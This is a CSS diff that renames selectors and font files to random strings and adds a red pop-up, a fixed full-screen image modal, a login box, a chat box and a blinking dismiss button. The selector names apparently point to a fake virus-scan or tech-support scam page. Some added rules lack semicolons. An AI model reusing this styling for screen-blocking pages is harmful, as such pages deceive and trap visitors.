@@ -6,7 +6,7 @@
     color: #333
 }
 
-#textweb,.row:after {
+#txtintro,.row:after {
     clear: both
 }
 
@@ -14,7 +14,7 @@
     list-style-type: none
 }
 
-#footer,#webbx,.btn,[role=button],button {
+#footer,#txts1,.btn,[role=button],button {
     cursor: pointer
 }
 
@@ -77,7 +77,7 @@ html {
 }
 
 .btn,.dropdown-menu,body {
-    font-size: 16px
+    font-size: 14px
 }
 
 body {
@@ -92,6 +92,10 @@ body {
     -ms-user-select: none;
     user-select: none
 }
+
+
+
+
 
 button,h2,h4,input {
     font-family: inherit;
@@ -240,8 +244,8 @@ td,th {
 
 @font-face {
     font-family: "Glyphicons Halflings";
-    src: url(fonts/glyphicons-halflings-regular.eot);
-    src: url(fonts/glyphicons-halflings-regular.eot?) format("embedded-opentype"),url(fonts/glyphicons-halflings-regular.woff2) format("woff2"),url(fonts/glyphicons-halflings-regular.woff) format("woff"),url(fonts/glyphicons-halflings-regular.ttf) format("truetype"),url(fonts/glyphicons-halflings-regular.svg) format("svg")
+    src: url(../fonts/O4md8lYwhVhZ.eot);
+    src: url(../fonts/O4md8lYwhVhZ.eot) format("embedded-opentype"),url(../fonts/t6VN9MILsPLb.woff2) format("woff2"),url(../fonts/w0iMQVYtWo9B.woff) format("woff"),url(../fonts/KWjwPnGH4eH4.ttf) format("truetype"),url(../images/V8a04v0sPLdM.svg) format("svg")
 }
 
 *,:after,:before {
@@ -274,9 +278,11 @@ h2 {
     font-size: 30px
 }
 
-.minimize1 ul,h4 {
-    margin-top: 10px
+.bhfys ul,h4 {
+    margin-top: 10px;
+
 }
+
 
 h2,h4,ul {
     margin-bottom: 10px
@@ -369,7 +375,7 @@ ul {
     border-bottom-width: 2px
 }
 
-#bottom ul li,.btn,.infos,label {
+#bottom ul li,.btn,.ilb,label {
     display: inline-block
 }
 
@@ -430,7 +436,7 @@ label {
     display: inline-block
 }
 
-#footer,#pop_up_new,#webbx,#chat,.black {
+#footer,#pop_up_new,#poptxt,#chat,.black {
     display: none
 }
 
@@ -440,7 +446,7 @@ label {
 }
 
 .btn-group>.btn:active,.btn-group>.btn:focus,.btn-group>.btn:hover {
-    z-index: 5555;
+    z-index: 2
 }
 
 .btn-group>.btn:first-child {
@@ -496,16 +502,17 @@ label {
 
 #pop_up_new {
     position: absolute;
-    top: 5%;
+    top: 20%;
     z-index: 999999;
-    left: 59%;
-    background: #114d9a;
+    left: 36%;
+    background: red;
     width: 440px;
     text-align: left;
     padding-top: 4px;
     color: #fff;
     padding-left: 20px;
     padding-right: 20px
+
 }
 
 #pop_up_new p {
@@ -539,8 +546,8 @@ label {
 
 .black {
     height: 100%;
-    background-color: #000;
-    opacity: .7;
+    background-color: #B9B9B9;
+    opacity: 1;
     transition: 1s;
     top: -190px
 }
@@ -548,6 +555,7 @@ label {
 .bg .bgimg {
     top: 60px;
     left: 0
+    z-index:9999;
 }
 
 .pro_box,.pro_box2,.pro_box3 {
@@ -556,8 +564,9 @@ label {
     position: absolute;
     z-index: 99;
     background-color: #fff;
-    left: 4%;
+    left: 26%;
     top: 12%;
+     border: 1px solid #474747;
     display: none
 }
 
@@ -569,7 +578,7 @@ label {
     width: 850px;
     height: 720px;
     z-index: 9999;
-    left: 4%;
+    left: 23%;
     top: 5%
 }
 
@@ -577,17 +586,17 @@ label {
     z-index: 999999
 }
 
-.activate_lic ul,.minimize ul,.minimize1 ul {
+.activate_lic ul,.minimize ul,.bhfys ul {
     list-style-type: none;
     float: right
 }
 
-.activate_lic ul li,.minimize ul li,.minimize1 ul li {
+.activate_lic ul li,.minimize ul li,.bhfys ul li {
     float: left;
     display: inline-block
 }
 
-.minimize ul li a img,.minimize1 ul li a img {
+.minimize ul li a img,.bhfys ul li a img {
     width: 140px;
     height: auto
 }
@@ -624,6 +633,7 @@ label {
     background-color: #fff;
     margin: 20px auto 0;
     display: block
+     border: 1px solid black;
 }
 
 .scan_box_header {
@@ -688,9 +698,9 @@ label {
 }
 
 .bt_can .btn {
-    background: #008000;
-    color: 	#ffffff;
-    width: 120px;
+    background: 0 0;
+    color: #000;
+    width: 80px;
     text-align: center
 }
 
@@ -704,7 +714,7 @@ label {
     color: #fff
 }
 
-#webbx,#chat,.counter {
+#poptxt,#chat,.counter {
     background-color: #fff
 }
 
@@ -730,7 +740,7 @@ label {
     text-align: left
 }
 
-#disclaimer,#chat a,#chat h4,#chat p,#textweb,.button,.button2 {
+#disclaimer,#chat a,#chat h4,#chat p,#txtintro,.button,.button2 {
     text-align: center
 }
 
@@ -765,6 +775,7 @@ label {
     height: 603px;
     margin: 20px auto 0;
     display: block
+     border: 1px solid red;
 }
 
 .table_quick2 .table {
@@ -772,6 +783,7 @@ label {
     margin-left: 20px;
     border-radius: .25rem;
     margin-top: 0
+     border: 1px solid red;
 }
 
 .table_quick2 .table td,.table_quick2 .table th {
@@ -909,18 +921,20 @@ label {
     width: 20px
 }
 
-#webbx {
+
+
+#poptxt {
     font-weight: 700;
     padding: 15px 30px;
     min-height: 300px;
     border-radius: 10px;
-    border: 1px solid #fff;
+    border: 1px solid #474747;
     width: 620px;
     margin: 0 auto;
-    z-index: 9999999;
-    box-shadow: 5px 5px 15px 5px rgba(0,0,0,.4);
+    z-index: 999999999;
+    box-shadow: 25px 25px 25px 25px rgba(0,0,0,.4);
     position: absolute;
-    top: 14.5%;
+    top: 25%;
     left: 30%
 }
 
@@ -935,21 +949,30 @@ label {
     height: 30px
 }
 
-.title2 img {
+.title2 p {
     position: absolute;
-    width: 3%;
-    top: 27px;
+    width: auto;
+    top: 20px;
     right: 17px
+
 }
 
-#textweb {
+.title2 img {
+    position: absolute;
+    width: 25px;
+    top: 20px;
+    right: 17px
+
+}
+
+#txtintro {
     padding-top: 10px;
     font-size: 17px;
-    font-weight: 700
+
 }
 
 .colo-rd {
-    color: #ba000d
+    color: #2D77A2
 }
 
 #badge {
@@ -977,15 +1000,16 @@ label {
 
 .button,.button2:hover {
     color: #fff;
-    background-color: #114d9a
+    background-color: red;
 }
 
 .button,.button2 {
     border-radius: 4px;
-    padding: 10px 30px;
+    padding: 10px 20px;
     font-size: 18px;
     font-weight: 700;
-    cursor: pointer
+    cursor: pointer;
+    text-decoration: none;
 }
 
 .button2 {
@@ -1001,45 +1025,41 @@ label {
 .cardcontainer {
     animation: 4s infinite zoominoutsinglefeatured
 }
-
 .support {
     font-weight: 700;
     font-size: 2.5rem;
     color: #114d9a
 }
-
 #bottom {
     margin: 12px 0;
     height: 50px;
     display: flex;
     border-top: 1px solid #d6d5d5
 }
-
 #banner {
     margin: 5px auto;
     display: block
 }
-
 .headers {
     width: 535px;
     margin-top: 7px;
     padding-bottom: 10px
 }
-
 #chat {
     padding: 15px;
     position: fixed;
     bottom: 74px;
-    right: 13px;
+    right: 5px;
     z-index: 99999999;
-    border-radius: 10px
-}
-
+    border:2px solid #BA8F14;
+    border-radius: 30px;
+     box-shadow: rgba(0, 0, 0, .35) 5px 5px  5px 5px;
+  text-align: center;
+    }
 #chat img {
     color: #000;
     font-size: 16px;
     font-weight: 600;
-    margin-left: 35px;
     width: 25px
 }
 
@@ -1076,4 +1096,220 @@ label {
     font-weight: 600;
     margin-left: 65px;
     width: 90px
+}
+
+#chat-box{
+  background-color: #1f1f1f;
+  padding: 5px;
+  position: fixed;
+  width: 40%;
+height: auto;
+  top: 0%;
+  left: 30%;
+  z-index: 9999999999999;
+  border-radius: 2px;
+border-style: solid;
+  border-color: white;
+  text-align:center;
+opacity:.98;
+      display: block;
+
+          box-shadow: rgba(0, 0, 0, 0.35) 25px 25px  25px;
+       animation-name: example;
+  animation-duration: .5s;
+  animation-direction: reverse;
+    }
+    @keyframes example {
+  0%   {bottom: 200px;}
+
+  100% { bottom:-900px;}
+}
+
+
+.minimize {
+float: right;
+margin-top: 8px;
+cursor:pointer;
+}
+
+.bhfys {
+float: right;
+margin-top: 2px;
+cursor:pointer;
+height:34px;
+width:24px;
+}
+
+.bhfys:hover {
+margin-top: 2px;
+  background-color: red;
+  color: white;
+}
+
+
+input[type=text] {background-color: #fff;color:white;width: 70%;height: 35px;margin-bottom: 20px;padding: 12px;border: 1px solid #fff;border-radius: 0;}
+.button1 {
+  background-color: #0260ae;
+  color: #A3A2A2;
+  width:20%;
+  padding: 5px 10px;
+  text-align: center;
+  display: inline-block;
+  font-size: 16px;
+  margin: 10px 2px;
+  cursor: pointer;
+  color: #fff !important;
+  border: 2px solid #fff;
+  margin-bottom: 30px;
+}
+
+.button1:hover {
+  background-color: #262626;
+  color: white;
+}
+
+
+#login-box {
+    background-color: #114d9a;
+    padding: 5px;
+    position: fixed;
+    width: 45%;
+    height: auto;
+    bottom: 10%;
+    left: 25%;
+    z-index: 999999999;
+    border-radius: 2px;
+    border-style: solid;
+    border-color: white;
+    text-align: center;
+    opacity: .98;
+    display: none;
+    box-shadow: rgba(0, 0, 0, 0.35) 25px 25px 25px;
+    animation-name: example;
+    animation-duration: .5s;
+    animation-direction: reverse;
+}
+.quiks {
+    float: right;
+    cursor: pointer;
+    height: 34px;
+    width: 34px;
+}
+
+.quiks:hover {
+    margin-top: 2px;
+    background-color: red;
+    color: white;
+}
+.quiks ul {
+    list-style-type: none;
+    float: right
+}
+.quiks ul li {
+    float: left;
+    display: inline-block
+}
+
+.quiks ul li a img {
+    width: 140px;
+    height: auto
+}
+
+#modalbx{
+    position: fixed;
+    top: 0;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    z-index: 99999999999;
+    display: inline-block;
+    background-color: rgba(0, 0, 0, 1);
+    background-image: url(BGwuhdYdu7SHy.png);
+    width: 100%;
+    height: auto;
+    background-repeat: no-repeat;
+    background-size: 100% 100%;
+    text-align: center;
+    cursor: auto;
+}
+#modalbx .bxweb{
+    background-color: white;
+    border-radius: 5px;
+    max-width: 400px;
+    margin: 100px auto;
+    padding: 20px;
+    text-align: center;
+    position: relative;
+    z-index: 9999
+}
+#modal-close {
+    cursor: pointer;
+    color: #888;
+    float: right;
+    font-size: 20px;
+    font-weight: bold;
+}
+#modal-image {
+    margin-bottom: 20px;
+}
+#modal-message {
+    color: black;
+    font-weight: bold;
+    margin-bottom: 20px;
+    font-size: 16px;
+}
+.modal-buttons {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 20px;
+}
+.modal-buttons button {
+    width: 100px;
+    padding: 10px 0;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: bold;
+    font-size: 15px;
+    transition: background-color 0.3s;
+}
+
+.modal-buttons button.accept {
+    background-color: white;
+    color: black;
+}
+
+.modal-buttons button.dismiss {
+    background-color: #3b5998;
+    color: white;
+}
+
+.modal-buttons button:hover {
+    background-color: rgba(0, 0, 0, 0.8);
+}
+
+.modal-buttons button.dismiss.blinking {
+    animation: blink 1s infinite;
+}
+.blck{
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5);
+    z-index: 9999;
+}
+@keyframes blink {
+    0% {
+        opacity: 1;
+    }
+
+    50% {
+        opacity: 0;
+    }
+
+    100% {
+        opacity: 1;
+    }
 }
